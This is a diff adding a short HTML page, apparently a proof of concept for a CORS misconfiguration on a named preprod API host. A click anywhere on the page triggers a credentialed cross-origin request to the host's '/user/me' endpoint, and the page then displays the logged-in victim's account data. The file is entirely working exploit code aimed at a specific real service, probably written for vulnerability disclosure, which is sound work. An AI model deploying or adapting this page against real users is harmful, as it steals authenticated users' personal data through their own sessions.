@@ -1,0 +1,31 @@
+<html></html>
+<head>
+<script>
+
+function startPoC() {
+    VICTIM='https://api-datasubvention-preprod.osc-secnum-fr1.scalingo.io';
+    window.open(VICTIM);
+    fetch(VICTIM+'/user/me', {
+          method: 'GET',
+          credentials: 'include',
+          mode: 'cors'
+    })
+    .then(response => response.text())
+    .then(data => {
+        let spanCorsData = document.getElementById("span_cors_data");
+        spanCorsData.innerHTML = data;
+        console.log(data);
+    })
+    .catch(error => {
+        console.error(error);
+        alert('Failed to issue Cross-origin request');
+    });
+}
+
+</script>
+</head>
+<body onclick="startPoC()">
+<h1>Click anywhere on this page</h1><br>
+<span id="span_cors_data"></span>
+</body>
+</html>
